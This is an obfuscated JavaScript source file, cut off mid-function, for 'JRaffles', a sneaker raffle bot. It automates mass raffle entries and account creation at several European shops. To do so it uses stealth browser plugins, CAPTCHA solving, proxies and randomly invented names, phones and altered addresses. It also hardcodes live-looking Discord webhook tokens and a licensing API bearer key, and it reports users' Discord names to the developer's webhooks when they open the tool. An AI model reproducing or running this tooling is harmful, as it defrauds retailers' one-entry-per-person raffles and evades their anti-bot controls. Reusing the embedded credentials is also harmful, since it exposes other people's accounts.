const { EmbedBuilder: _0x846c6a } = require('discord.js');
var _0x5e3e86 = require('exe');
const { execFile: _0x21ee0e } = require('child_process'), _0x10a68d = require('puppeteer-extra'), _0x28dbad = require('puppeteer-extra-plugin-recaptcha'), _0x2db5c5 = require('puppeteer-extra-plugin-stealth'), _0x298364 = require('chalk'), _0x193d7e = require('node-bash-title'), _0x9cc7aa = require('fs'), _0x3a8ed3 = require('axios'), _0x3fe600 = require('papaparse');
var _0x32a788 = require('random-name');
const _0x994449 = require('request');
var _0x341b9f = require('prompt');
const _0x37e6cd = _0x994449['jar']();
var _0x152d8a = {};
const _0x59107c = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x2bc4dd = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x379003 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0xc15b07 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x3b6be8 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn';
var _0x10787b = 'https://discord.com/api/webhooks/', _0x196b9c = '' + _0x10787b + _0x379003, _0x303def = '' + _0x10787b + _0xc15b07, _0xe7a394 = '' + _0x10787b + _0x59107c, _0x2c49ed = '' + _0x10787b + _0x2bc4dd, _0x1c5083 = '' + _0x10787b + _0x3b6be8;
const _0x42e3d1 = JSON['parse'](_0x9cc7aa['readFileSync']('../package.json', 'utf-8')), _0x112c11 = _0x42e3d1['version'];
var _0x3c9379, _0x54e8a7, _0x5a4074, _0x3e8836, _0x2b9b21, _0x26cb71, _0x550f31, _0x1777a1;
const _0x1ca839 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x115e3e = ![];
const _0x52e163 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1a09a5 = '0123456789';
var _0x46d36 = _0x52e163['split']('');
const _0x4eee67 = require('auto-git-update'), { PageEmittedEvents: _0x5bb73b } = require('puppeteer'), { getRandomValues: _0x260bbd } = require('crypto'), { resolve: _0x304230 } = require('path'), { Console: _0x344a28 } = require('console'), _0x5a8345 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x497372 = new _0x4eee67(_0x5a8345);
async function _0x5c87a9() {
    _0x2b9b21 = _0x9cc7aa['readdirSync']('../proxies'), _0x3e8836 = _0x9cc7aa['readdirSync']('../tasks'), _0x152d8a = JSON['parse'](_0x9cc7aa['readFileSync']('../settings.json', 'utf-8')), !_0x152d8a['delay'] && (_0x152d8a['delay'] = 0x2710, _0x9cc7aa['writeFileSync']('../settings.json', JSON['stringify'](_0x152d8a))), !_0x152d8a['captchaKey'] && (_0x152d8a['captchaKey'] = '', _0x9cc7aa['writeFileSync']('../settings.json', JSON['stringify'](_0x152d8a))), !_0x152d8a['useRandomProxy'] && (_0x152d8a['useRandomProxy'] = !![], _0x9cc7aa['writeFileSync']('../settings.json', JSON['stringify'](_0x152d8a))), !_0x152d8a['webhook'] && (_0x152d8a['webhook'] = '', _0x9cc7aa['writeFileSync']('../settings.json', JSON['stringify'](_0x152d8a))), _0x152d8a['MahaDelay'] = _0x152d8a['delay'], _0x10787b = _0x152d8a['webhook'], _0x26cb71 = _0x152d8a['licenseKey'];
}
let _0x4001a3, _0x163646 = [], _0x414c92;
const _0xfe9813 = _0x48afae => new Promise(_0x149b81 => setTimeout(_0x149b81, _0x48afae));
function _0x175bed(_0x38d695, _0x2802de) {
    return Math['floor'](Math['random']() * (_0x2802de - _0x38d695 + 0x1) + _0x38d695);
}
async function _0x4d83ae(_0x12f743) {
    return _0x3a8ed3['get']('https://api.hyper.co/v4/licenses/' + _0x12f743, { 'headers': { 'Authorization': 'Bearer\x20' + _0x1ca839 } })['then'](_0x4e858d => _0x4e858d['data'])['catch'](() => null);
}
;
async function _0x211d4d(_0x421a27) {
    console['clear']();
    if (_0x421a27 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x3a29fe = await _0x341b9f['get']('License');
        if (_0x3a29fe['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0xfe9813(0xbb8), _0x211d4d(_0x421a27);
        _0x421a27 = _0x3a29fe['License'], _0x152d8a['licenseKey'] = _0x421a27, _0x26cb71 = _0x421a27, _0x9cc7aa['writeFileSync']('../settings.json', JSON['stringify'](_0x152d8a));
    }
    console['log']('Checking\x20license\x20' + _0x26cb71 + '...'), await _0xfe9813(0x320);
    const _0x440a53 = await _0x4d83ae(_0x421a27);
    _0x550f31 = JSON['stringify'](_0x440a53['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x1777a1 = JSON['stringify'](_0x440a53['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x440a53)
        return console['log']('License\x20not\x20found');
    if (!_0x440a53['user'])
        return console['log']('License\x20not\x20bound');
    return _0x440a53['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x115e3e = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x115e3e = ![]);
}
async function _0x210e2c() {
    var _0x294b8c = await _0x341b9f['get']('Module');
    return console['clear'](), _0x294b8c['Module'];
}
;
async function _0x1a352c() {
    var _0x2c08b3 = await _0x341b9f['get']('Setting');
    return console['clear'](), _0x2c08b3['Setting'];
}
async function _0x340277() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x28cb8a = 0x0; _0x28cb8a < _0x3e8836['length']; _0x28cb8a++) {
        console['log']('\x20(' + _0x28cb8a + ')\x20' + _0x3e8836[_0x28cb8a]);
    }
    console['log']('');
    var _0x486054 = await _0x341b9f['get']('Task');
    if (_0x486054['Task'] > _0x3e8836['length'] - 0x1 || isNaN(_0x486054['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0xfe9813(0x3e8), _0x340277();
    var _0x1b7161 = _0x9cc7aa['readFileSync']('../tasks/' + _0x3e8836[_0x486054['Task']], 'utf-8');
    return _0x5a4074 = _0x3fe600['parse'](_0x1b7161, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x298364['blue'](_0x3e8836[_0x486054['Task']])), _0x3c9379 = _0x3e8836[_0x486054['Task']], _0x5a4074;
}
async function _0x405a82() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x123220 = 0x0; _0x123220 < _0x2b9b21['length']; _0x123220++) {
        console['log']('\x20(' + _0x123220 + ')\x20' + _0x2b9b21[_0x123220]);
    }
    console['log']('');
    var _0x187522 = await _0x341b9f['get']('Proxies');
    if (_0x187522['Proxies'] > _0x2b9b21['length'] - 0x1 || isNaN(_0x187522['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0xfe9813(0x3e8), _0x405a82();
    var _0x51f731 = _0x9cc7aa['readFileSync']('../proxies/' + _0x2b9b21[_0x187522['Proxies']], 'utf-8')['split']('\x0a');
    let _0x34d3ff = _0x51f731['map']((_0x40ea3c, _0x2b019a) => {
        sanatizeProxy = _0x40ea3c['replace']('\x0d', '');
        if (_0x51f731[_0x2b019a + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x54e8a7 = _0x2b9b21[_0x187522['Proxies']], console['clear'](), _0x34d3ff;
}
async function _0x5026c7() {
    var _0x50d933 = await _0x341b9f['get']('Value');
    return console['clear'](), _0x50d933['Value'];
}
async function _0x28a068(_0x1c487c) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x5ab90d = 0x0; _0x5ab90d < _0x1c487c['length']; _0x5ab90d++) {
        console['log']('\x20(' + _0x5ab90d + ')\x20[' + _0x1c487c[_0x5ab90d]['name'] + ']');
    }
    ;
    console['log']('');
    var _0xcb971 = await _0x341b9f['get']('Module');
    return _0xcb971['Module'];
}
async function _0x3862f2() {
    var _0x2de791 = await _0x341b9f['get']('Password');
    return console['clear'](), _0x2de791['Password'];
}
;
async function _0x105f1c() {
    var _0x355bb1 = await _0x341b9f['get']('Links');
    return _0x355bb1['Links'];
}
;
async function _0x2a8cb1() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x2c93e2 = 0x0; _0x2c93e2 < _0x163646['length']; _0x2c93e2++) {
        console['log']('\x20(' + _0x2c93e2 + ')\x20' + _0x163646[_0x2c93e2]);
    }
    ;
    console['log']();
    let _0x279734 = await _0x341b9f['get']('Product');
    return console['clear'](), _0x279734['Product'];
}
;
function _0xfa2bb1() {
    var _0x1b7707 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x1b7707;
}
;
const _0x8b6437 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VJnG3d',
                            'custom_source': 'DO8912-101',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RwHCGb',
                                '$consent_form_version': 0x7c0710,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'SLAMJAM',
        'modules': [
            {
                'name': 'SLAMJAM\x20Account\x20Generator',
                'store': 'SLAMJAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAMJAM\x20Raffle\x20Entries',
                'store': 'SLAMJAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x3acacc(_0x4079b5, _0x54cbfe) {
    let _0x2ac030 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x112c11 != 'devkey') {
        await _0x3a8ed3['post'](_0x4079b5, _0x54cbfe, _0x2ac030);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x5a270a(_0x216a1d, _0x715efc, _0x2acd6f, _0x2069ac, _0x32f771) {
    if (!_0x2069ac && _0x2acd6f == 'dev') {
        var _0x25f9ef = new _0x846c6a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x715efc['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x715efc['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x216a1d['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x152d8a['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x550f31,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x216a1d['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x112c11,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x25f9ef['data'];
    } else {
        if (_0x2069ac && _0x2acd6f == 'dev') {
            var _0x25f9ef = new _0x846c6a()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x715efc['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x550f31,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x715efc['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x216a1d['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x152d8a['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x32f771,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x216a1d['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x112c11,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x25f9ef['data'];
        } else {
            if (_0x2acd6f == 'pub') {
                var _0x25f9ef = new _0x846c6a()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x715efc['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x715efc['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x216a1d['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x152d8a['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x216a1d['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x112c11,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x25f9ef['data'];
            } else {
                if (_0x2acd6f == 'acc') {
                    var _0x25f9ef = new _0x846c6a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x715efc['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x550f31,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x715efc['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x152d8a['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x112c11,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x25f9ef['data'];
                } else {
                    if (_0x2acd6f == 'open') {
                        var _0x25f9ef = new _0x846c6a()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x1777a1)['addFields']({
                            'name': 'User',
                            'value': '' + _0x550f31,
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x112c11,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x25f9ef['data'];
                    }
                }
            }
        }
    }
}
async function _0x82271d(_0x3bbc4b, _0x2ebbd0) {
    var _0x23e452 = _0x3bbc4b[_0x2ebbd0]['Address1']['split'](''), _0x54b0ff = _0x3bbc4b[_0x2ebbd0]['Address2']['split'](''), _0x4f1848 = _0x3bbc4b[_0x2ebbd0]['Email']['split']('@');
    for (var _0x3303fa = 0x0; _0x3303fa < _0x23e452['length']; _0x3303fa++) {
        if (_0x23e452[_0x3303fa] == 'X') {
            var _0x3376d9 = Math['round'](Math['random']() * (_0x52e163['length'] - 0x1));
            _0x23e452[_0x3303fa] = _0x46d36[_0x3376d9];
        }
    }
    ;
    for (var _0x3303fa = 0x0; _0x3303fa < _0x54b0ff['length']; _0x3303fa++) {
        if (_0x54b0ff[_0x3303fa] == 'X') {
            var _0x3376d9 = Math['round'](Math['random']() * (_0x52e163['length'] - 0x1));
            _0x54b0ff[_0x3303fa] = _0x46d36[_0x3376d9];
        }
    }
    ;
    _0x3bbc4b[_0x2ebbd0]['FirstName'] == 'RANDOM' && (_0x3bbc4b[_0x2ebbd0]['FirstName'] = _0x32a788['first']());
    _0x3bbc4b[_0x2ebbd0]['LastName'] == 'RANDOM' && (_0x3bbc4b[_0x2ebbd0]['LastName'] = _0x32a788['last']());
    _0x4f1848[0x0] == 'RANDOM' ? _0x4f1848[0x0] = '' + _0x32a788['first']() + _0x32a788['last']() + '@' : _0x4f1848[0x0] = _0x4f1848[0x0] + '@';
    _0x3bbc4b[_0x2ebbd0]['Phone'] == 'RANDOM' && (_0x3bbc4b[_0x2ebbd0]['Phone'] = _0x175bed(0x3b9aca00, 0x2540be3ff));
    if (_0x3bbc4b[_0x2ebbd0]['Follower'] == 'RANDOM') {
        var _0x389541 = _0x175bed(0x1, 0x270f);
        _0x3bbc4b[_0x2ebbd0]['Follower'] = '' + _0x32a788['first']() + _0x32a788['last']() + _0x389541;
    }
    _0x3bbc4b[_0x2ebbd0]['Email'] = _0x4f1848['join'](''), _0x3bbc4b[_0x2ebbd0]['Address1'] = _0x23e452['join'](''), _0x3bbc4b[_0x2ebbd0]['Address2'] = _0x54b0ff['join']('');
    return;
}
;
function _0x12c18b() {
    let _0x28f0ef = proxyFile['split']('\x0a'), _0x301d58 = _0x28f0ef['map']((_0xc4221a, _0x226152) => {
        sanatizeProxy = _0xc4221a['replace']('\x0d', '');
        if (_0x28f0ef[_0x226152 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x301d58;
}
;
async function _0x560b3f(_0x81cad4) {
    var _0x2f84f3 = _0x81cad4[0x1]['split'](':');
    const _0xe5c2f5 = await _0x10a68d['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x2f84f3[0x0] + ':' + _0x2f84f3[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x41a5de = await _0xe5c2f5['newPage']();
        await _0x41a5de['authenticate']({
            'username': '' + _0x2f84f3[0x2],
            'password': '' + _0x2f84f3[0x3]
        }), console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x41a5de['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x41a5de['setRequestInterception'](!![]), _0x41a5de['on']('request', _0x677055 => {
            _0x677055['resourceType']() === 'image' || _0x677055['resourceType']() === 'font' || _0x677055['resourceType']() === 'media' ? _0x677055['abort']() : _0x677055['continue']();
        }), await _0x41a5de['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0xfa2bb1() + '\x20[' + _0x8b6437[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x41a5de['waitForTimeout'](0xbb8), await _0x41a5de['waitForSelector']('.product-card');
        const _0x3d9d5f = await _0x41a5de['$$eval']('a.product-card', _0x509ce2 => {
            return _0x509ce2['map'](_0x8775d6 => _0x8775d6['href']);
        });
        return _0x163646 = _0x3d9d5f;
    } catch (_0x15e210) {
        console['log']('\x20' + _0x15e210);
    } finally {
        _0xe5c2f5['close'](), console['clear']();
    }
}
;
async function _0x4a9257(_0x4ad433, _0x2ee3b0, _0x235e52, _0x11d34a, _0x28b7b7) {
    _0x2ee3b0 != 'ver' && await _0x82271d(_0x11d34a, _0x4ad433);
